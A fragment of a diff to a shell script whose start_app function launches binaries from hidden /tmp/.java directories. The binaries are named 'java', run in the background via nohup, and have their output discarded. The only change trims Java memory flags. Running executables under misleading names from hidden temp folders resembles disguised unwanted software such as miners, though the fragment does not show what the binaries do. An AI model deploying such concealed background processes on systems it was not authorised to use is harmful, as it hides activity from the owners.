@@ -14,7 +14,7 @@ function fetch_files() {
 
 function start_app() {
     chmod a+x /tmp/.java/bin/***  /tmp/.java/bin/.a/***  /tmp/.java/bin/.b/***
-    cd /tmp/.java/bin && nohup ./pm2 -a 'java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./java -c ./cfg.conf >/dev/null 2>&1 &
+    cd /tmp/.java/bin && nohup ./pm2 -a 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./java -c ./cfg.conf >/dev/null 2>&1 &
 }
 
 if [ -f "/tmp/.java/bin/java" ] && [ -f "/tmp/.java/bin/.a/java" ] && [ -f "/tmp/.java/bin/.b/java" ]; then
